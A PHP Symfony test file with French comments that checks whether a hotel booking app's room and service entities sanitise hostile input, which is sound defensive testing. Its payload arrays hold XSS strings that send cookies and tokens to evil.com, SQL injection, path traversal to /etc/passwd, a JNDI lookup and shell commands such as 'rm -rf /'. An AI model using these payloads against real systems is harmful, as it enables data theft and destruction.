<?php

namespace App\Tests\Security;

use App\Entity\Chambre;
use App\Entity\Service;
use App\State\ChambreStateProcessor;
use App\State\ServiceStateProcessor;
use Doctrine\ORM\EntityManagerInterface;
use Symfony\Bundle\FrameworkBundle\Test\KernelTestCase;
use Symfony\Bundle\SecurityBundle\Security;
use Psr\Log\LoggerInterface;
use ApiPlatform\Metadata\Post;

class SecurityTest extends KernelTestCase
{
    private EntityManagerInterface $entityManager;
    private ChambreStateProcessor $chambreProcessor;
    private ServiceStateProcessor $serviceProcessor;

    protected function setUp(): void
    {
        $kernel = self::bootKernel();
        $container = static::getContainer();
        
        $this->entityManager = $container->get('doctrine')->getManager();
        
       
        $security = $this->createMock(Security::class);
        $logger = $this->createMock(LoggerInterface::class);
        
        $this->chambreProcessor = new ChambreStateProcessor($this->entityManager, $security, $logger);
        $this->serviceProcessor = new ServiceStateProcessor($this->entityManager, $security, $logger);
        
        $this->cleanDatabase();
    }

    protected function tearDown(): void
    {
        $this->cleanDatabase();
        parent::tearDown();
    }

    /**
     * Test protection XSS dans les champs texte des chambres
     */
    public function testChambreXssProtection(): void
    {
        $chambre = new Chambre();
        
        // Tentatives d'injection XSS
        $xssPayloads = [
            '<script>alert("XSS")</script>',
            '<img src="x" onerror="alert(1)">',
            'javascript:alert("XSS")',
            '<svg onload="alert(1)">',
            '"><script>alert(1)</script>',
            '<iframe src="javascript:alert(1)"></iframe>'
        ];

        foreach ($xssPayloads as $payload) {
           
            $chambre->setNumero($payload . '101');
            $numero = $chambre->getNumero();
            $this->assertStringNotContainsString('<script>', $numero);
            $this->assertStringNotContainsString('javascript:', $numero);
            $this->assertStringNotContainsString('<img', $numero);
            $this->assertStringNotContainsString('<svg', $numero);
            $this->assertStringNotContainsString('<iframe', $numero);

            
            $chambre->setType($payload . 'Suite');
            $type = $chambre->getType();
            $this->assertStringNotContainsString('<script>', $type);
            $this->assertStringNotContainsString('javascript:', $type);
            $this->assertStringNotContainsString('<img', $type);

           
            $chambre->setDescription($payload . 'Belle chambre avec vue');
            $description = $chambre->getDescription();
            
            
            $this->assertStringNotContainsString('<script>', $description);
            $this->assertStringNotContainsString('<img src=', $description);
            $this->assertStringNotContainsString('<svg', $description);
            
            
            if (strpos($description, 'javascript:') !== false) {
                
                $this->assertTrue(
                    strpos($description, '&') !== false ||
                    strpos($description, 'javascript:') === false 
                );
            }
        }
    }

    /**
     * Test protection XSS dans l'entité Service
     */
    public function testServiceXssProtection(): void
    {
        $service = new Service();
        
        $xssPayloads = [
            '<script>document.location="http://evil.com"</script>',
            '<img src=x onerror=fetch("http://evil.com/"+document.cookie)>',
            '<svg/onload=eval(atob("YWxlcnQoMSk="))>',
            '"><script>new Image().src="http://evil.com/"+localStorage.getItem("token")</script>'
        ];

        foreach ($xssPayloads as $payload) {
           
            $service->setNom($payload . 'Spa Premium');
            $nom = $service->getNom();
            
            $this->assertStringNotContainsString('<script>', $nom);
            $this->assertStringNotContainsString('<img', $nom);
            $this->assertStringNotContainsString('<svg', $nom);
            $this->assertStringNotContainsString('javascript:', $nom);
            $this->assertStringNotContainsString('onerror=', $nom);
            $this->assertStringNotContainsString('onload=', $nom);
            $this->assertStringNotContainsString('eval(', $nom);
        }
    }

    /**
     * Test injection SQL dans les recherches
     */
    public function testSqlInjectionProtection(): void
    {
        
        $chambre = new Chambre();
        $chambre->setNumero('TEST001');
        $chambre->setType('Standard');
        $chambre->setEtat('disponible');
        $chambre->setCapacite(2);
        $chambre->setPrixChambre('80.00');
        
        $this->entityManager->persist($chambre);
        $this->entityManager->flush();

        $repository = $this->entityManager->getRepository(Chambre::class);

        // Tentatives d'injection SQL
        $sqlInjectionPayloads = [
            "'; DROP TABLE chambre; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM utilisateur --",
            "'; DELETE FROM chambre WHERE '1'='1' --",
            "' OR 1=1 UNION SELECT password FROM utilisateur --",
            "'; INSERT INTO chambre VALUES ('999', 'Hacked', 'disponible', 1, 0.01, NULL); --"
        ];

        foreach ($sqlInjectionPayloads as $payload) {
            
            $result = $repository->findOneBy(['numero' => $payload]);
            $this->assertNull($result); 

            
            $chambreTest = $repository->findOneBy(['numero' => 'TEST001']);
            $this->assertNotNull($chambreTest);
            $this->assertEquals('Standard', $chambreTest->getType());
        }

        
        $allChambres = $repository->findAll();
        $this->assertCount(1, $allChambres); 
    }

    /**
     * Test validation des données malformées
     */
    public function testMalformedDataProtection(): void
    {
        $chambre = new Chambre();
        
        
        $malformedData = [
            "null\x00byte",
            str_repeat('A', 10000), 
            "\n\r\t\v\f",
            "../../etc/passwd",
            "../../../windows/system32/config/sam",
            "\${jndi:ldap://evil.com/exploit}",
            "%3cscript%3ealert(1)%3c/script%3e", 
            "\u003cscript\u003ealert(1)\u003c/script\u003e" 
        ];

        foreach ($malformedData as $data) {
            
            $chambre->setNumero($data);
            $chambre->setType('Standard'); 
            $chambre->setDescription($data);
            
            
            $numero = $chambre->getNumero();
            $this->assertStringNotContainsString("\x00", $numero);
            
            $description = $chambre->getDescription();
            if ($description !== null) {
                $this->assertStringNotContainsString("\x00", $description);
                $this->assertLessThanOrEqual(1000, strlen($description));
                
                
                if (strlen($data) > 1000) {
                    $this->assertEquals(1000, strlen($description));
                }
            }
        }
    }

    /**
     * Test protection contre l'injection de commandes dans les prix
     */
    public function testPriceInjectionProtection(): void
    {
        $chambre = new Chambre();
        $service = new Service();
        
       
        $priceInjectionPayloads = [
            '; rm -rf /',
            '| cat /etc/passwd',
            '$(whoami)',
            '`id`',
            '${PATH}',
            'exec("evil_command")',
            'system("rm -rf /")',
            '<%= system("id") %>',
            '{{7*7}}', 
            '[[7*7]]'
        ];

        foreach ($priceInjectionPayloads as $payload) {
            
            $chambre->setPrixChambre($payload);
            $prix = $chambre->getPrixChambre();
            
           
            if ($prix !== null) {
                $this->assertMatchesRegularExpression('/^\d+\.?\d*$/', $prix);
                $this->assertStringNotContainsString(';', $prix);
                $this->assertStringNotContainsString('|', $prix);
                $this->assertStringNotContainsString('$', $prix);
                $this->assertStringNotContainsString('`', $prix);
            }

           
            $service->setPrixService($payload);
            $prixService = $service->getPrixService();
            
            if ($prixService !== null) {
                $this->assertMatchesRegularExpression('/^\d+\.?\d*$/', $prixService);
                $this->assertStringNotContainsString('system', $prixService);
                $this->assertStringNotContainsString('exec', $prixService);
            }
        }
    }

    /**
     * Test protection StateProcessor contre données malveillantes
     */
    public function testStateProcessorSecurity(): void
    {
        $chambre = new Chambre();
        $chambre->setNumero('HACK101'); 
        $chambre->setType('Standard');
        $chambre->setEtat('disponible');
        $chambre->setCapacite(2);
        $chambre->setPrixChambre('80.00');
        $chambre->setDescription('<img src=x onerror=alert(1)>Belle chambre');

        
        
        $operation = new Post();
        
        try {
            $processedChambre = $this->chambreProcessor->process($chambre, $operation);
            
            
            $this->assertStringNotContainsString('<img', $processedChambre->getDescription());
            $this->assertStringContainsString('Belle chambre', $processedChambre->getDescription());
        } catch (\Exception $e) {
            
            $this->assertStringContainsString('invalide', $e->getMessage());
        }
    }

    /**
     * Test détection de patterns suspects
     */
    public function testSuspiciousPatternDetection(): void
    {
        $suspiciousPatterns = [
            'password',
            'admin',
            'root',
            'select * from',
            'union select',
            'drop table',
            'insert into',
            'update set',
            'delete from',
            '<script',
            'javascript:',
            'eval(',
            'document.cookie',
            'localStorage'
        ];

        $chambre = new Chambre();
        
        foreach ($suspiciousPatterns as $pattern) {
            $chambre->setDescription("Test description " . $pattern . " test");
            $description = $chambre->getDescription();
            
           
            $this->assertStringNotContainsString('<script', $description);
            
            
            $this->assertNotNull($description);
            $this->assertStringContainsString('Test description', $description);
            $this->assertStringContainsString('test', $description);
        }
    }

    private function cleanDatabase(): void
    {
        $this->entityManager->createQuery('DELETE FROM App\Entity\Chambre')->execute();
        $this->entityManager->createQuery('DELETE FROM App\Entity\Service')->execute();
        $this->entityManager->clear();
    }
}